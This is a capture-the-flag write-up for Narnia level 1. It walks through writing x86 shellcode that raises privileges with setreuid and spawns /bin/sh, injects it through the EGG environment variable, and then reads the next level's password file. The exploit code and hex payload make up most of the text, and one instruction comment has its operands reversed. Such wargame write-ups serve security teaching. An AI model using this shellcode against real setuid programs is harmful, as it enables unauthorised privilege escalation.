# Narnia Level 1

## Introduction
Narnia level 1 consists of a program compiled from C that takes in an environment variable called EGG and saves it as a pointer to a function. It then checks whether the variable is NULL, and if it is not, it will attempt to execute this function. Taking in an environment variable and executing it as code provides an easy avenue for the user to inject arbitrary code and execute it. Therefore, our exploit will consist of machine code that runs a privileged shell, which we will place in EGG.

## Part 1. Crafting a Payload in C
To create a template for our payload, we will begin by writing a short function in C that sets the real/effective user IDs to the user ID of the file's author, then executes /bin/sh:

```
#include <stdlib.h>
int main() {
	setreuid(geteuid(),geteuid());
        system("/bin/sh");
	return 0;
}
```

This function, when compiled, creates machine code that we can use for our exploit. If we run narnia1 in GDB:

```
cd /narnia
gdb ./narnia1
disass main
```

We see that the disassembled code uses 32-bit memory addresses and 32-bit registers, such as *%eax* and *%esp*, meaning the program, and our exploit, should be compiled to x86. We create a temp directory and an exploit file:

```
mktemp -d
cd <temp directory>
nano exploit.c
```

Then we paste in our exploit code, save the file, compile, enter a debug session, and disassemble the code:

```
gcc exploit.c -m32 -o exploit
gdb ./exploit
disass /r main
```

The following is our output:

```
0x000011ad <+0>:     8d 4c 24 04             lea    0x4(%esp),%ecx
0x000011b1 <+4>:     83 e4 f0                and    $0xfffffff0,%esp
0x000011b4 <+7>:     ff 71 fc                push   -0x4(%ecx)
0x000011b7 <+10>:    55                      push   %ebp
0x000011b8 <+11>:    89 e5                   mov    %esp,%ebp
0x000011ba <+13>:    56                      push   %esi
0x000011bb <+14>:    53                      push   %ebx
0x000011bc <+15>:    51                      push   %ecx
0x000011bd <+16>:    83 ec 0c                sub    $0xc,%esp
0x000011c0 <+19>:    e8 eb fe ff ff          call   0x10b0 <__x86.get_pc_thunk.bx>
0x000011c5 <+24>:    81 c3 0b 2e 00 00       add    $0x2e0b,%ebx
0x000011cb <+30>:    e8 70 fe ff ff          call   0x1040 <geteuid@plt>
0x000011d0 <+35>:    89 c6                   mov    %eax,%esi
0x000011d2 <+37>:    e8 69 fe ff ff          call   0x1040 <geteuid@plt>
0x000011d7 <+42>:    83 ec 08                sub    $0x8,%esp
0x000011da <+45>:    56                      push   %esi
0x000011db <+46>:    50                      push   %eax
0x000011dc <+47>:    e8 7f fe ff ff          call   0x1060 <setreuid@plt>
0x000011e1 <+52>:    83 c4 10                add    $0x10,%esp
0x000011e4 <+55>:    83 ec 0c                sub    $0xc,%esp
0x000011e7 <+58>:    8d 83 38 e0 ff ff       lea    -0x1fc8(%ebx),%eax
0x000011ed <+64>:    50                      push   %eax
0x000011ee <+65>:    e8 5d fe ff ff          call   0x1050 <system@plt>
0x000011f3 <+70>:    83 c4 10                add    $0x10,%esp
0x000011f6 <+73>:    b8 00 00 00 00          mov    $0x0,%eax
0x000011fb <+78>:    8d 65 f4                lea    -0xc(%ebp),%esp
0x000011fe <+81>:    59                      pop    %ecx
0x000011ff <+82>:    5b                      pop    %ebx
0x00001200 <+83>:    5e                      pop    %esi
0x00001201 <+84>:    5d                      pop    %ebp
0x00001202 <+85>:    8d 61 fc                lea    -0x4(%ecx),%esp
0x00001205 <+88>:    c3                      ret
```

## Part 2: Editing the Payload

The first 11 lines or so are part of x86 calling convention or protective measures put in place by the GCC compiler and can be ignored. Lines 12-15 run *geteuid()* twice and save the results in *%eax* and *%esi*. These values are then pushed onto the stack as arguments for *setreuid()* and *setreuid()* is then executed. Finally, */bin/sh* is placed on the stack and *system()* is run, which then opens the shell. The lines afterward exist to clean up and prepare to exit the main function. Therefore, we will use these lines and modify them to create our payload:

```
0x000011cb <+30>:    e8 70 fe ff ff          call   0x1040 <geteuid@plt>
0x000011d0 <+35>:    89 c6                   mov    %eax,%esi
0x000011d2 <+37>:    e8 69 fe ff ff          call   0x1040 <geteuid@plt>
0x000011d7 <+42>:    83 ec 08                sub    $0x8,%esp
0x000011da <+45>:    56                      push   %esi
0x000011db <+46>:    50                      push   %eax
0x000011dc <+47>:    e8 7f fe ff ff          call   0x1060 <setreuid@plt>
0x000011e1 <+52>:    83 c4 10                add    $0x10,%esp
0x000011e4 <+55>:    83 ec 0c                sub    $0xc,%esp
0x000011e7 <+58>:    8d 83 38 e0 ff ff       lea    -0x1fc8(%ebx),%eax
0x000011ed <+64>:    50                      push   %eax
0x000011ee <+65>:    e8 5d fe ff ff          call   0x1050 <system@plt>
```

This code is close to what we will need to exploit narnia1, but we cannot use it yet. The modifications needed are as follows:
1. The functions geteuid(), setreuid(), and system() need to be referenced directly instead of through the PLT.
2. We need to append the string "/bin/sh" after the last machine code instruction and push a pointer to it to the stack.

Luckily, *ASLR is turned off*, so the virtual memory addresses at which our functions and our payload string will be stored will not change between executions of narnia1. Running narnia1 in GDB and typing "s" to start the program with a breakpoint, we can run the following commands to find the memory addresses of geteuid(), setreuid(), and system():

```
info address geteuid        # Symbol "geteuid" is a function at address 0xf7e648c0.
info address setreuid       # Symbol "setreuid" is at 0xf7e9e860 in a file compiled without debugging.
info address system         # Symbol "system" is at 0xf7dcd430 in a file compiled without debugging.
```

Now that we have the memory addresses of these functions, we can edit our payload to reference these addresses directly. We can replace the function calls in our payload with these lines:

```
B8 C0 48 E6 F7        mov eax, 0xF7E648C0  ; geteuid
FF D0                 call eax

B8 60 E8 E9 F7        mov eax, 0xF7E9E860  ; setreuid
FF D0                 call eax

B8 30 D4 DC F7        mov eax, 0xF7DCD430  ; system
FF D0                 call eax
```

We will also need to push a pointer to the string "/bin/sh" to the stack so that system() will execute properly. We replace the LEA command in our payload with the following:

```
68 00 00 00 00      push 0x00000000     ; Dummy value pushed to stack for now
```

Then, we append the string "/bin/sh" in hexadecimal to the end of our payload. The payload should currently look like this:

```
export EGG=$'\xB8\xC0\x48\xE6\xF7\xFF\xD0\x89\xC6\xB8\xC0\x48\xE6\xF7\xFF\xD0\x83\xEC\x08\x56\x50\xB8\x60\xE8\xe9\xF7\xFF\xD0\x83\xC4\x10\x83\xEC\x0C\x68\x00\x00\x00\x00\xB8\x30\xD4\xDC\xF7\xFF\xD0\x2F\x62\x69\x6E\x2F\x73\x68'
```

The payload has all of the instructions we need to execute and is the correct length, so to find the correct pointer to "/bin/sh", we inject the exploit and enter GDB again.

```
start           # Once in GDB, run this to begin ./narnia1 with a breakpoint.

p getenv("EGG") # Gets the address and contents of the currently loaded environment variable.
                # The address of EGG was 0xffffddd4 in my experience.

x/s 0xffffddfc  # In my experience, this address pointed to the string /bin/sh
```

Replace the dummy address in the push command with the address you found for "/bin/sh".

My final payload is below:

```
B8 C0 48 E6 F7        mov eax, 0xF7E648C0  ; Calls geteuid, moves output to %esi.
FF D0                 call eax
89 C6                 mov eax, esi

B8 C0 48 E6 F7        mov eax, 0xF7E648C0  ; Calls geteuid a second time.
FF D0                 call eax

83 EC 08              sub esp, 8           ; Pushes the results on the stack for setreuid.
56                    push esi
50                    push eax

B8 60 E8 E9 F7        mov eax, 0xF7E9E860  ; setreuid to escalate privileges
FF D0                 call eax
83 C4 10              add esp, 16

83 EC 0C              sub esp, 12
68 FC DD FF FF        push 0xFFFFDDFC      ; Push "/bin/sh" on the stack.

B8 30 D4 DC F7        mov eax, 0xF7DCD430  ; Run system given "/bin/sh"
FF D0                 call eax

2F 62 69 6E 2F 73 68  db "/bin/sh"

export EGG=$'\xB8\xC0\x48\xE6\xF7\xFF\xD0\x89\xC6\xB8\xC0\x48\xE6\xF7\xFF\xD0\x83\xEC\x08\x56\x50\xB8\x60\xE8\xe9\xF7\xFF\xD0\x83\xC4\x10\x83\xEC\x0C\x68\xFC\xDD\xFF\xFF\xB8\x30\xD4\xDC\xF7\xFF\xD0\x2F\x62\x69\x6E\x2F\x73\x68'
```

After setting this environment variable, we run ./narnia1. We should immediately be dropped into a privileged shell, from which we can see the password for narnia2 with the command:

```
cat /etc/narnia_pass/narnia2
```

The password, hashed with SHA-256, is 6576f118971633ecf3edf994ce5d5b21dfd3a4e099054a4efab770e6cf1fc513.